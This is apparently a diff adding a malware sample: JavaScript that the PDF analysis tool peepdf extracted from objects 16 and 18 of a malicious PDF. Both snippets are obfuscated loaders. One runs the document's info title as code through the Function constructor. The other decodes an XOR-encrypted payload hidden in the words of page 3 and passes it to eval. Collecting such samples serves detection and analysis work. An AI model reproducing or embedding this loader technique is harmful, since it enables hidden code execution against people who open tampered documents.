@@ -1,0 +1,27 @@
+// peepdf comment: Javascript code located in object 16 (version 0)
+
+var Application = Function,
+    myScreen = 'inf',
+    borderRadius = 'ti';
+myScreen += 'o', borderRadius += 'tle';
+new Application(this[myScreen][borderRadius])();
+
+// peepdf comment: Javascript code located in object 18 (version 0)
+
+var hG = 19826;
+var qR = '',
+    p = '%',
+    h = app.doc;
+this.mD = 14379;
+var x = h['getPag' + 'eNu' + 'mWords'](3);
+var pS = 218;
+var eN = h['unes' + 'cape'];
+var z = String;
+for (var v = 0; v < x; v++) {
+    zC = h['getPag' + 'eNt' + 'hWord'](3, v);
+    var kV = zC['subs' + 'tr'](zC.length - 2, 2);
+    var zQ = eN(p + kV)['charCo' + 'deAt'](0);
+    qR += z['from' + 'CharC' + 'ode'](zQ ^ pS);
+}
+eval(qR);
+
